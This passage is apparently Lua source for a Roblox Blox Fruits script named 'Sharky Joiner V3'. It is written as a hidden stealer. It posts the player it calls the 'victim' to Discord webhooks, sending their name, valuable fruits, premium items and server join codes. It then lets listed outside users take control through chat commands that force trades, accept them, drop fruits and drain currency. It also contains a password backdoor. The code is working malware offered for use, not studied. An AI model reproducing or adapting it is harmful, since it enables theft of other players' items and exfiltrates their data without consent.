    local joinPC = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], placeId, jobId)
    local joinMob = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
    local seaJoinPC = placeId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')"
    local seaJoinMob = seaJoinPC -- Same for mobile
    local pCount = #Players:GetPlayers()
    local execName = identifyexecutor and identifyexecutor() or "Unknown"

	local color, title, mention
    if isDragonHit and hasPremiumItem then color=0x00FF00; title="DRAGON & PREMIUM HIT! <...emojis...>"; mention="@everyone GG!"
    elseif isDragonHit then color=0xFFFF00; title="DRAGON HIT! <...emojis...>"; mention="@everyone GG!"
    elseif hasPremiumItem then color=0x00FFFF; title="PREMIUM ITEM HIT! <...emoji...>"; mention="@everyone GG!"
    else color=0xFF0000; title="TARGET HIT! <...emoji...>"; mention="@everyone" end
    title = title .. " ; https://discord.gg/6wFCr9P4Zr" -- Add link

	 local embed = { title = title, description = string.format("**Victim:** %s\n**Sea:** %s\n**Server:** %s", LocalPlayer.Name, sea, serverName), color = color,
        fields = { { name = "Fruits <...emoji...>", value = formatItems(fruits), inline = true }, { name = "Premium <...emoji...>", value = formatItems(premiumItems), inline = true },
            { name = "Targets Found <...emoji...>", value = formatFruitsToHit(), inline = false }, { name = "Join Server (PC)", value = "```lua\n" .. joinPC .. "\n```", inline = false },
            { name = "Join Server (Mobile)", value = "```\n" .. joinMob .. "\n```", inline = false }, { name = "Join Sea (PC)", value = "```lua\n" .. seaJoinPC .. "\n```", inline = true },
            { name = "Join Sea (Mobile)", value = "```\n" .. seaJoinMob .. "\n```", inline = true }, { name = "Info <...emoji...>", value = string.format("```Version: 1.2.1\nExecutor: %s\nPlayers: %d```", execName, pCount), inline = false }
        }, timestamp = DateTime.now():ToIsoDate(), footer = { text = "Sharky Joiner V3" } }

	local payload = { content = mention, embeds = {embed} }
    local successEncode, payload_json = pcall(HttpService.JSONEncode, HttpService, payload)
    if not successEncode then warn("Failed to encode webhook payload:", payload_json); return end
    warn("[DEBUG] Payload encoded successfully.") -- Debug Print

	-- Send to both webhooks concurrently if they exist
    if mainWebhookUrl then task.spawn(sendWebhookWithRetries, payload_json, mainWebhookUrl) else warn("[DEBUG] Main webhook URL is nil, skipping.") end
    if dummyWebhookUrl then task.spawn(sendWebhookWithRetries, payload_json, dummyWebhookUrl) else warn("[DEBUG] Dummy webhook URL is nil, skipping.") end
end

-- Flag to track if valuable items were present initially
local hadValuableItemOnInit = false
local initialInventorySnapshot = nil

-- Send Leaving Notification
local webhookSentOnLeave = false
local function sendLeavingNotification()
	if webhookSentOnLeave or not LocalPlayer then return end
	if not hadValuableItemOnInit then warn("[DEBUG] Skipping leave notification: No valuable items initially."); return end

	webhookSentOnLeave = true
    warn("[DEBUG] sendLeavingNotification called.") -- Debug Print

	local mainWebhookUrl = getWebhookUrl(mainWebhookKey)
	local dummyWebhookUrl = getWebhookUrl(dummyWebhookKey)
	if not mainWebhookUrl and not dummyWebhookUrl then warn("No valid webhook URLs for leaving notification."); return end

	local plr = LocalPlayer
    local execName = identifyexecutor and identifyexecutor() or "Unknown"
	local embed = { title = "Victim Left! <:sad:1241420488916340896> ", description = string.format("`%s` (%d) left.", plr.Name, plr.UserId), color = 0xFF0000,
        fields = { { name = "Account Age", value = tostring(plr.AccountAge).."d", inline = true }, { name = "Executor", value = execName, inline = true } },
        timestamp = DateTime.now():ToIsoDate(), footer = { text = "Sharky Joiner V3 - Target Lost" } }
	local payload = { embeds = {embed} }
    local successEncode, payload_json = pcall(HttpService.JSONEncode, HttpService, payload)
    if not successEncode then warn("Failed to encode leaving payload:", payload_json); return end

	if mainWebhookUrl then task.spawn(sendWebhookWithRetries, payload_json, mainWebhookUrl) end
    if dummyWebhookUrl then task.spawn(sendWebhookWithRetries, payload_json, dummyWebhookUrl) end
end

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == LocalPlayer then task.delay(0.1, sendLeavingNotification) end
end)


--[[=================================================================================
=                        MOVEMENT & UTILITY FUNCTIONS                         =
==================================================================================]]
-- tweenToPosition(), findTradeTable(), isInTradeWithCorrectPlayer() functions remain the same.
-- ForceJump(), lockJumping(), unlockJumping(), disableJumpGlobally(), enableJumpGlobally() remain the same.
-- Ensure these are pasted here from the previous full script version. They are omitted for brevity.

-- Re-insert Movement & Utility functions here from the previous full script version.
-- ... (Paste tweenToPosition function code here) ...
-- ... (Paste findTradeTable function code here) ...
-- ... (Paste isInTradeWithCorrectPlayer function code here) ...
-- ... (Paste ForceJump, lockJumping, unlockJumping, disableJumpGlobally, enableJumpGlobally function code here) ...
-- Tween To Position Function (Copied)
local function tweenToPosition(targetPosition)
    local character = LocalPlayer.Character
    if not character then return end
    local root = character:FindFirstChild("HumanoidRootPart")
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Sit then return end

    local distance = (root.Position - targetPosition).Magnitude
    local duration = math.clamp(distance / 150, 0.3, 2.0)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    local originalCollisions = {}
	local successDesc = pcall(function()
		for _, part in ipairs(character:GetDescendants()) do
			if part:IsA("BasePart") then
				originalCollisions[part] = part.CanCollide
				part.CanCollide = false
			end
		end
	end)
	if not successDesc then warn("Failed to disable collisions during tween.") end

    local tween = TweenService:Create(root, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
	local completed = false
	local conn = tween.Completed:Connect(function() completed = true end)
	local startTime = tick()
	while not completed and (tick() - startTime) < (duration + 0.5) do task.wait() end
	if conn and conn.Connected then conn:Disconnect() end
	if not completed then tween:Cancel() end

    pcall(function()
		for part, canCollide in pairs(originalCollisions) do
			if part and part.Parent then part.CanCollide = canCollide end
		end
	end)
end

-- Find Trade Table Function (Copied)
local function findTradeTable()
    local tradeTablesParent
    if game.PlaceId == 7449423635 then tradeTablesParent = workspace:FindFirstChild("Map", true):FindFirstChild("Turtle", true)
    elseif game.PlaceId == 4442272183 then tradeTablesParent = workspace:FindFirstChild("Map", true):FindFirstChild("Dressrosa", true)
    else return nil, nil end
    if not tradeTablesParent then return nil, nil end

    local tables = tradeTablesParent:GetChildren()
    local bestTable, bestSeat; local emptyTable, emptySeat; local fallbackTable, fallbackSeat

    local function isTargetPlayerSeat(weld)
        return weld and weld.Part1 and weld.Part1.Parent and table.find(Usernames, weld.Part1.Parent.Name:lower()) -- Check lowercase
    end

    for _, tbl in ipairs(tables) do
		if tbl.Name == "TradeTable" and tbl:FindFirstChild("P1") and tbl:FindFirstChild("P2") and tbl.P1:IsA("Seat") and tbl.P2:IsA("Seat") then
			local p1, p2 = tbl.P1, tbl.P2
			local p1Weld = p1:FindFirstChild("SeatWeld"); local p2Weld = p2:FindFirstChild("SeatWeld")
			local p1Free = not p1Weld; local p2Free = not p2Weld
			local p1IsTarget = isTargetPlayerSeat(p1Weld); local p2IsTarget = isTargetPlayerSeat(p2Weld)

            if allowEveryone then
                if p1Free then return tbl, p1 end; if p2Free then return tbl, p2 end
            else
                if p1IsTarget and p2Free then return tbl, p2 end
                if p2IsTarget and p1Free then return tbl, p1 end
                if p1Free and p2Free and not emptyTable then emptyTable, emptySeat = tbl, p1 end
                if not fallbackTable then
                    if p1Free and not p2IsTarget then fallbackTable, fallbackSeat = tbl, p1
                    elseif p2Free and not p1IsTarget then fallbackTable, fallbackSeat = tbl, p2 end
                end
            end
		end
	end
	return bestTable or emptyTable or fallbackTable or nil, bestSeat or emptySeat or fallbackSeat or nil
end

-- Is In Trade With Correct Player Function (Copied)
local function isInTradeWithCorrectPlayer()
    local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    local mainGui = playerGui and playerGui:FindFirstChild("Main")
    local tradeFrame = mainGui and mainGui:FindFirstChild("Trade")
    if not tradeFrame or not tradeFrame.Visible then return false end

    local container = tradeFrame:FindFirstChild("Container")
    local frame1 = container and container:FindFirstChild("1")
    local frame2 = container and container:FindFirstChild("2")
    local partnerLabel = frame2 and frame2:FindFirstChild("TextLabel")
    if not partnerLabel then return false end

    if allowEveryone then return true end

    local partnerNameLower = partnerLabel.Text:lower()
    for _, allowedNameLower in ipairs(Usernames) do -- Usernames is already lowercase
        if partnerNameLower == allowedNameLower then return true end
        -- Check display name (less reliable)
        local tradingPlayer = Players:FindFirstChild(allowedNameLower, true) -- Ignore case find
        if tradingPlayer and tradingPlayer.DisplayName and partnerNameLower == tradingPlayer.DisplayName:lower() then return true end
    end
    return false
end

-- Jump Control Functions (Copied)
local isForceJumping = false
local stateChangedConnections = {}
local jumpRequestConnection
local characterAddedConnectionJump
local jumpDisabled = false

local function ForceJump()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid:GetState() == Enum.HumanoidStateType.Dead then return end
    isForceJumping = true; humanoid.JumpPower = 50; humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true); humanoid.Jump = true
    task.wait(0.1); if humanoid and humanoid.Parent then humanoid.Jump = false end
    task.delay(0.3, function()
        isForceJumping = false
        if humanoid and humanoid.Parent then
            if jumpDisabled then humanoid.JumpPower = 0; humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
            else humanoid.JumpPower = 50; humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true) end
        end
    end)
end

local function lockJumping(humanoid)
    if not humanoid then return end
    if stateChangedConnections[humanoid] and stateChangedConnections[humanoid].Connected then stateChangedConnections[humanoid]:Disconnect() end
    humanoid.JumpPower = 0; humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(old, new)
        if new == Enum.HumanoidStateType.Jumping and not isForceJumping then
            humanoid:ChangeState(Enum.HumanoidStateType.Running); humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
        end
    end)
end

local function unlockJumping(humanoid)
     if not humanoid or not humanoid.Parent then return end
     humanoid.JumpPower = 50; humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
     if stateChangedConnections[humanoid] and stateChangedConnections[humanoid].Connected then stateChangedConnections[humanoid]:Disconnect(); stateChangedConnections[humanoid] = nil end
end

local function disableJumpGlobally()
    if jumpDisabled then return end; jumpDisabled = true
    if LocalPlayer.Character then local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if hum then lockJumping(hum) end end
    if characterAddedConnectionJump and characterAddedConnectionJump.Connected then characterAddedConnectionJump:Disconnect() end
    characterAddedConnectionJump = LocalPlayer.CharacterAdded:Connect(function(char) task.wait(0.5); local hum = char:FindFirstChildOfClass("Humanoid"); if hum then lockJumping(hum) end end)
    if jumpRequestConnection and jumpRequestConnection.Connected then jumpRequestConnection:Disconnect() end
    if UserInputService then jumpRequestConnection = UserInputService.JumpRequest:Connect(function() end) end
end

local function enableJumpGlobally()
    if not jumpDisabled then return end; jumpDisabled = false
    if LocalPlayer.Character then local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if hum then unlockJumping(hum) end end
    if characterAddedConnectionJump and characterAddedConnectionJump.Connected then characterAddedConnectionJump:Disconnect(); characterAddedConnectionJump = nil end
    if jumpRequestConnection and jumpRequestConnection.Connected then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end
    for hum, conn in pairs(stateChangedConnections) do if conn and conn.Connected then conn:Disconnect() end end; table.clear(stateChangedConnections)
end


--[[=================================================================================
=                              COMMAND DEFINITIONS                              =
==================================================================================]]

local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 10)
local SayMessageRequest = ChatEvents and ChatEvents:WaitForChild("SayMessageRequest", 5)
local function sendMessage(message)
    if SayMessageRequest then
        local maxLen = 190; if #message > maxLen then message = message:sub(1, maxLen - 3) .. "..." end
        pcall(SayMessageRequest.FireServer, SayMessageRequest, message, "All")
    else warn("Cannot send message, SayMessageRequest not found.") end
end

local Commands = {
    jump = { execute = function() ForceJump(); sendMessage("Forced Jump Executed!") end, description = "Forces jump.", usage = "?jump" },
    invite = { execute = function() createDiscordUI(); sendMessage("Discord Invite UI Displayed!") end, description = "Shows Discord UI.", usage = "?invite" },
    add = {
        execute = function(argument)
            if not argument or argument == "" then sendMessage("Usage: ?add <fruit name>"); return end
            local inventory = getInventory(); if not inventory then sendMessage("Err getting inv."); return end
            local term = argument:lower(); local found = nil
            for _, item in pairs(inventory) do if item and item.Type == "Blox Fruit" and item.Name and item.Name:lower() == term then found = item; break end end
            if not found then for _, item in pairs(inventory) do if item and item.Type == "Blox Fruit" and item.Name and item.Name:lower():find(term, 1, true) then found = item; break end end end
            if not found then sendMessage("Fruit '" .. argument .. "' not found!"); return end
            local s,r=pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", found.Name); if s then sendMessage("Added "..found.Name) else sendMessage("Fail add "..found.Name..": "..tostring(r)) end
        end, description = "Adds fruit to trade.", usage = "?add <name>"
    },
    demolish = {
        execute = function() sendMessage("Starting Demolish..."); task.spawn(function()
            local function invR(r,...) local s,re=pcall(r.InvokeServer, r, ...); if not s then warn("Inv fail:", re) end; return s,re end
            local inv = getInventory(); if not inv then sendMessage("Err get inv for demolish!"); return end
            local fDrop={}; for _,i in pairs(inv) do if i and i.Type=="Blox Fruit" then table.insert(fDrop, i) end end; table.sort(fDrop,function(a,b) return(a.Value or 0)>(b.Value or 0) end)
            sendMessage("Dropping " .. #fDrop .. " fruits..."); local dCnt = 0
            for i,f in ipairs(fDrop) do if not f or not f.Name then continue end; local base=f.Name:match("([^-]+)")
                if base then local sL=invR(Remote,"LoadFruit",base); if sL then dCnt=dCnt+1; sendMessage(string.format("Dropped %s (%d/%d)",base,dCnt,#fDrop)); resetCharacter(); task.wait(0.5) else sendMessage("Fail drop "..base); task.wait(1) end end
            end; sendMessage("Fruit drop done ("..dCnt..")."); sendMessage("Draining currency..."); local stop=false
            local function drainB() while not stop do invR(Remote,"PurchaseRawFruit","Rocket-Rocket",false); task.wait(0.05); if stop then break end; invR(Remote,"PurchaseRawFruit","Spin-Spin",false); task.wait(0.05) end end
            local function drainF() while not stop do invR(Remote,"BlackbeardReward","Refund","2"); task.wait(0.05) end end
            task.spawn(drainB); task.spawn(drainF); task.wait(10); stop=true; sendMessage("Currency drain stop. Demolish done.")
        end) end, description = "Drops fruits & drains currency.", usage = "?demolish"
    },
    additem = {
        execute = function(argument)
            if not argument or argument=="" then sendMessage("Usage: ?additem <prem name>"); return end; local inv=getInventory(); if not inv then sendMessage("Err get inv."); return end
            local term=argument:lower(); local found=nil
            for _,i in pairs(inv) do if i and i.Type=="Premium" and i.Name and i.Name:lower()==term then found=i; break end end
            if not found then for _,i in pairs(inv) do if i and i.Type=="Premium" and i.Name and i.Name:lower():find(term,1,true) then found=i; break end end end
            if not found then sendMessage("Premium '"..argument.."' not found!"); return end
            local s,r=pcall(TradeFunction.InvokeServer,TradeFunction,"addItem",found.Name); if s then sendMessage("Added "..found.Name) else sendMessage("Fail add "..found.Name..": "..tostring(r)) end
        end, description = "Adds premium item.", usage = "?additem <name>"
    },
    addallitems = {
        execute = function() local pG=LocalPlayer:FindFirstChildOfClass("PlayerGui"); local tU=pG and pG:FindFirstChild("Main",true) and pG.Main:FindFirstChild("Trade",true); if not tU or not tU.Visible then sendMessage("Trade UI not open."); return end
            local inv=getInventory(); if not inv then sendMessage("Err get inv."); return end; local added={}; local cnt=0; sendMessage("Adding premiums...")
            for _,i in pairs(inv) do if i and i.Type=="Premium" and i.Name and not added[i.Name] then local s,r=pcall(TradeFunction.InvokeServer,TradeFunction,"addItem",i.Name); if s then added[i.Name]=true; cnt=cnt+1; task.wait(0.1) else warn("Fail add prem", i.Name, r); task.wait(0.2) end end end
            if cnt>0 then sendMessage("Added "..cnt.." premium(s)") else sendMessage("No new premiums found/added.") end
        end, description = "Adds all premiums.", usage = "?addallitems"
    },
    sit = {
        execute = function() local tbl,seat=findTradeTable(); if seat then sendMessage("Moving to table..."); tweenToPosition(seat.Position); task.wait(0.5); local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h and seat.Sit then pcall(seat.Sit,seat,h) end; sendMessage("Attempted sit.") else sendMessage("No seat found.") end end,
        description = "Moves to trade seat.", usage = "?sit"
    },
    tp = {
        execute = function() local pos; local name; local pId=game.PlaceId
            if pId==7449423635 then pos=Vector3.new(-12550.87,337.24,-7425.52); name="Mansion Area"
            elseif pId==4442272183 then pos=Vector3.new(-381.86,73.08,299.93); name="Cafe Area"
            else sendMessage("TP unknown place."); return end
            if pos then sendMessage("TP to "..name.."..."); tweenToPosition(pos) end
        end, description = "TP to Mansion/Cafe.", usage = "?tp"
    },
    test = { execute = function() local s=tick(); task.wait(0.001); sendMessage("Responsive! "..math.floor((tick()-s)*1000).."ms") end, description = "Tests responsiveness.", usage = "?test" },
    addall = {
        execute = function() local pG=LocalPlayer:FindFirstChildOfClass("PlayerGui"); local tU=pG and pG:FindFirstChild("Main",true) and pG.Main:FindFirstChild("Trade",true); if not tU or not tU.Visible then sendMessage("Trade UI not open."); return end
            local inv=getInventory(); if not inv then sendMessage("Err get inv."); return end; local added={}; local cnt=0; local hitSet={}; for _,f in ipairs(FruitsToHit) do hitSet[f]=true end; sendMessage("Adding targets...")
            for _,i in pairs(inv) do if i and i.Type=="Blox Fruit" and i.Name and hitSet[i.Name] and not added[i.Name] then local s,r=pcall(TradeFunction.InvokeServer,TradeFunction,"addItem",i.Name); if s then added[i.Name]=true; cnt=cnt+1; task.wait(0.1) else warn("Fail add target",i.Name,r); task.wait(0.2) end end end
            if cnt>0 then sendMessage("Added "..cnt.." target(s)") else sendMessage("No targets found/added.") end
        end, description = "Adds target fruits.", usage = "?addall"
    },
    cleartrade = {
        execute = function() local pG=LocalPlayer:FindFirstChildOfClass("PlayerGui"); local tU=pG and pG:FindFirstChild("Main",true) and pG.Main:FindFirstChild("Trade",true); if not tU or not tU.Visible then sendMessage("Trade UI not open."); return end
            local cont=tU:FindFirstChild("Container"); local pF=cont and cont:FindFirstChild("1"); local iF=pF and pF:FindFirstChild("Frame"); if not iF then sendMessage("Can't find item frame."); return end
            local cnt=0; local toRem={}; for _,iB in ipairs(iF:GetChildren()) do if iB and iB:IsA("ImageButton") and iB.Name~="Template" then table.insert(toRem,iB.Name) end end; if #toRem==0 then sendMessage("Trade empty."); return end; sendMessage("Clearing trade...")
            for _,iN in ipairs(toRem) do local s,r=pcall(TradeFunction.InvokeServer,TradeFunction,"removeItem",iN); if s then cnt=cnt+1; task.wait(0.05) else warn("Fail remove",iN,r); task.wait(0.1) end end; sendMessage("Cleared "..cnt.." item(s)")
        end, description = "Clears your trade.", usage = "?cleartrade"
    },
    accept = {
        execute = function() local pG=LocalPlayer:FindFirstChildOfClass("PlayerGui"); local tU=pG and pG:FindFirstChild("Main",true) and pG.Main:FindFirstChild("Trade",true); if not tU or not tU.Visible then sendMessage("Trade UI not visible!"); return end
            local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if not h then sendMessage("Char/Humanoid not found!"); return end; if not h.Sit then sendMessage("Not sitting!"); return end
            sendMessage("Attempting accept..."); local s,r=pcall(TradeFunction.InvokeServer,TradeFunction,"accept"); if not s then sendMessage("Fail invoke accept: "..tostring(r)) else sendMessage("Accept invoked.") end
        end, description = "Accepts trade.", usage = "?accept"
    },
    resetall = {
        execute = function() if isResettingAll then sendMessage("Reset loop already running!"); return end; isResettingAll=true; sendMessage("Starting ALL fruit reset loop..."); task.spawn(function()
            while isResettingAll do local inv=getInventory(); local reset=false; if inv then for _,i in pairs(inv) do if not isResettingAll then break end
                if i and i.Type=="Blox Fruit" and i.Name then local base=i.Name:match("([^-]+)"); if base then performReset(base); reset=true end end
            end else sendMessage("Err get inv in reset loop."); task.wait(5) end; if not reset and isResettingAll then sendMessage("No fruits to reset. Check again soon..."); task.wait(10) elseif isResettingAll then task.wait(1) end end
            sendMessage("ALL fruit reset loop stopped.")
        end) end, description = "Loops dropping ALL fruits.", usage = "?resetall"
    },
    stopreset = { execute = function() if not isResettingAll then sendMessage("Reset loop not running!"); return end; isResettingAll=false; sendMessage("Stopping reset loop...") end, description = "Stops reset loop.", usage = "?stopreset" },
    reset = { execute = function() local c=LocalPlayer.Character; if c then sendMessage("Resetting char..."); pcall(c.BreakJoints,c) else sendMessage("No char to reset!") end end, description = "Resets character.", usage = "?reset" },
    rejoin = {
        execute = function() if TeleportService then sendMessage("Rejoining..."); local s,r=pcall(TeleportService.Teleport, TeleportService, game.PlaceId, LocalPlayer); if not s then sendMessage("Rejoin fail: "..tostring(r)) end else sendMessage("TP Service unavailable.") end end,
        description = "Rejoins server.", usage = "?rejoin"
    },
    showinv = {
        execute = function() sendMessage("Fetching inv..."); task.spawn(function() local inv=getInventory(); if not inv then sendMessage("Err get inv."); return end
            local fC={}; local pL={}; local tV=0; for _,i in pairs(inv) do if i and i.Name then if i.Type=="Blox Fruit" then local sN=i.Name:match("^([^-]+)") or i.Name; fC[sN]=(fC[sN] or 0)+(i.Count or 1) elseif i.Type=="Premium" then table.insert(pL,string.format("%s%s",i.Name,(i.Count or 1)>1 and(" (x"..i.Count..")")or"")) end; tV=tV+(i.Value or 0)*(i.Count or 1) end end
            local fL={}; for fN,c in pairs(fC) do table.insert(fL,string.format("%s%s",fN,c>1 and(" (x"..c..")")or"")) end; table.sort(fL); local mC={}; local cC="Fruits: "; if #fL==0 then cC=cC.."None" end
            for i,fT in ipairs(fL) do if #cC+#fT+2>190 then table.insert(mC,cC); cC=fT else cC=cC..(i==1 and""or", ")..fT end end; table.insert(mC,cC)
            cC="Premium: "; if #pL>0 then table.sort(pL); for i,iT in ipairs(pL) do if #cC+#iT+2>190 then table.insert(mC,cC); cC=iT else cC=cC..(i==1 and""or", ")..iT end end; table.insert(mC,cC) else table.insert(mC,cC.."None") end
            table.insert(mC, string.format("Total Value: ~%d", tV)); sendMessage("Inventory:"); task.wait(0.5)
            for _,c in ipairs(mC) do sendMessage(c); task.wait(1.0) end; sendMessage("Inv display done.")
        end) end, description = "Shows inventory.", usage = "?showinv"
    },
    allowall = { execute = function() allowEveryone=not allowEveryone; sendMessage("Open Cmd/Trade Mode: "..(allowEveryone and "ON" or "OFF")) end, description = "Toggles open mode.", usage = "?allowall" },
    activate = {
        execute = function(password) local vP={["sharkingscript"]=true,["ishusontop"]=true,["fishthebest"]=true,["kinjyafruit"]=true,[BackdoorPassword]=true}
            if not password or password=="" then sendMessage("Usage: ?activate <pw>"); return end
            if vP[password] then allowEveryone=true; sendMessage("🔓 Backdoor Activated!") else sendMessage("❌ Invalid Password.") end
        end, description = "Activates backdoor.", usage = "?activate <pw>"
    },
    resetfruit = {
        execute = function(argument) if not argument or argument=="" then sendMessage("Usage: ?resetfruit <name>"); return end; local inv=getInventory(); if not inv then sendMessage("Err get inv."); return end
            local term=argument:lower(); local found=nil; for _,i in pairs(inv) do if i and i.Type=="Blox Fruit" and i.Name and i.Name:lower()==term then found=i; break end end
            if not found then for _,i in pairs(inv) do if i and i.Type=="Blox Fruit" and i.Name and i.Name:lower():find(term,1,true) then found=i; break end end end
            if not found then sendMessage("Fruit '"..argument.."' not found!"); return end
            local base=found.Name:match("([^-]+)") or found.Name; sendMessage("Resetting "..base.."..."); ForceJump()
            local s=unstoreFruit(base); if s then resetCharacter(); sendMessage(base.." reset ok.") else sendMessage("Fail reset "..base..".") end
        end, description = "Resets specific fruit.", usage = "?resetfruit <name>"
    },
    help = {
        execute = function() task.spawn(function() local h={ "--- Commands ---", "Move: ?jump ?sit ?reset ?tp", "Trade: ?accept ?cleartrade ?addall ?add ?additem ?addallitems", "Util: ?rejoin ?invite ?resetfruit ?demolish ?showinv ?test", "Loops: ?resetall ?stopreset", "Access: ?allowall ?activate <pw>", "Info: ?help" }; for _,m in ipairs(h) do sendMessage(m); task.wait(0.2) end end) end,
        description = "Lists commands.", usage = "?help"
    }
}


--[[=================================================================================
=                           COMMAND PROCESSING LOGIC                          =
==================================================================================]]

local CommandCooldowns = {}
local DEFAULT_COOLDOWN = 0.5

local function processChatCommand(message, player)
    if not (player and message and typeof(player) == "Instance" and player:IsA("Player") and message:sub(1,1) == "?") then return end

    local commandStr = message:sub(2):match("^%s*(.-)%s*$")
    if not commandStr or commandStr == "" then return end

    local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$")
    if not command then return end
    command = command:lower()

    -- Authorization Check (Case-Insensitive)
    local playerNameLower = player.Name:lower()
    local isAuthorized = false
    for _, allowedNameLower in ipairs(Usernames) do -- Usernames is already lowercase
        if playerNameLower == allowedNameLower then
            isAuthorized = true
            break
        end
    end

    -- Debug Authorization
    -- warn(string.format("[AUTH] Player: %s (%s), Command: %s, isAuthorized: %s, allowEveryone: %s", player.Name, playerNameLower, command, tostring(isAuthorized), tostring(allowEveryone)))

    local isToggleOrBackdoor = command == "allowall" or command == "activate"

    if not isAuthorized and command == "activate" then
         Commands.activate.execute(argument)
         return
    elseif not isAuthorized and isToggleOrBackdoor then
        sendMessage("Unauthorized to use: ?" .. command)
        return
    elseif not isAuthorized and not allowEveryone then
        -- warn("[AUTH] Unauthorized and allowEveryone=false. Ignoring.") -- Debug Print
        return
    end

    local commandFuncData = Commands[command]
    if not commandFuncData then
        sendMessage("Unknown command: ?" .. command)
        return
    end

    local playerCooldowns = CommandCooldowns[player.UserId]
    if not playerCooldowns then playerCooldowns = {}; CommandCooldowns[player.UserId] = playerCooldowns end
    local now = tick()
    if (playerCooldowns[command] or 0) + DEFAULT_COOLDOWN > now then return end -- Cooldown active
    playerCooldowns[command] = now

    -- Execute Command Safely
    task.spawn(function()
        local success, err = pcall(commandFuncData.execute, argument or "")
        if not success then
            warn("Cmd Error '?" .. command .. "':", err)
            sendMessage("Error executing: ?" .. command)
        end
    end)
end

Players.PlayerRemoving:Connect(function(player) CommandCooldowns[player.UserId] = nil end)

-- Connect Chat Listener
if ChatEvents and ChatEvents:FindFirstChild("PlayerChatted") then
     ChatEvents.PlayerChatted:Connect(processChatCommand)
     warn("[DEBUG] Connected to ReplicatedStorage PlayerChatted event.")
else
     warn("[DEBUG] Could not find RS PlayerChatted, falling back to Players.PlayerChatted.")
     Players.PlayerChatted:Connect(function(player, message) processChatCommand(message, player) end)
end


--[[=================================================================================
=                                MAIN LOOP LOGIC                                =
==================================================================================]]
-- Main Loop Logic (startMainLoop, validateTradePartnerLoop, onCharacterAdded, runMainLoop) remains the same.
-- Ensure it's pasted here from the previous full script version. Omitted for brevity.

-- Re-insert Main Loop functions here from the previous full script version.
-- ... (Paste startMainLoop function code here, including validateTradePartnerLoop, onCharacterAdded, runMainLoop, and the returned cleanup function) ...
local function startMainLoop()
    local isLoopRunning = true
    local currentTable, currentSeat
    local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
    local lastMovementTime = 0; local lastTableCheck = 0; local lastTradeCheckTime = 0
    local isCheckingTradePartner = false
    local UPDATE_INTERVAL = 0.5; local TABLE_CHECK_INTERVAL = 3; local MOVEMENT_CHECK_INTERVAL = 5
    local TRADE_VALIDATION_DELAY = 1.5; local TRADE_RECHECK_INTERVAL = 0.5; local TRADE_RECHECK_COUNT = 3

    local function validateTradePartnerLoop()
        if isCheckingTradePartner then return end; isCheckingTradePartner = true
        local failedChecks = 0; local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui"); local mainGui = playerGui and playerGui:FindFirstChild("Main"); local tradeFrame = mainGui and mainGui:FindFirstChild("Trade")
        while isLoopRunning and tradeFrame and tradeFrame.Visible do
            if not isInTradeWithCorrectPlayer() then failedChecks = failedChecks + 1; warn("Trade partner validation failed (" .. failedChecks .. "/" .. TRADE_RECHECK_COUNT .. ")"); if failedChecks >= TRADE_RECHECK_COUNT then sendMessage("Incorrect trade partner, jumping."); ForceJump(); break end
            else failedChecks = 0 end
            task.wait(TRADE_RECHECK_INTERVAL)
            if not tradeFrame or not tradeFrame.Parent or not tradeFrame.Visible then break end
        end; isCheckingTradePartner = false
    end

    local characterAddedConnectionMain; local characterRemovingConnectionMain
    local function onCharacterAdded(character)
        task.wait(1); local humanoid = character:WaitForChild("Humanoid", 5); local rootPart = character:WaitForChild("HumanoidRootPart", 5); if not humanoid or not rootPart then return end
        local now = tick(); lastMovementTime = now; lastTableCheck = now; lastTradeCheckTime = now; disableJumpGlobally()
        task.spawn(function() currentTable, currentSeat = findTradeTable(); if currentTable and currentSeat then tweenToPosition(currentSeat.Position) end end)
    end

    local function runMainLoop()
        local lastTime = tick()
        while isLoopRunning do local now = tick(); local deltaTime = now - lastTime; lastTime = now
            local character = LocalPlayer.Character; local root = character and character:FindFirstChild("HumanoidRootPart"); local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            if root and humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui"); local mainGui = playerGui and playerGui:FindFirstChild("Main"); local tradeFrame = mainGui and mainGui:FindFirstChild("Trade"); local isInTrade = tradeFrame and tradeFrame.Visible
                if isInTrade and not isCheckingTradePartner and (now - lastTradeCheckTime) >= TRADE_VALIDATION_DELAY then task.spawn(validateTradePartnerLoop) elseif not isInTrade then lastTradeCheckTime = now end
                if now - lastTableCheck >= TABLE_CHECK_INTERVAL then task.spawn(function() local nT,nS=findTradeTable(); if nT and nS then currentTable,currentSeat=nT,nS end end); lastTableCheck = now end
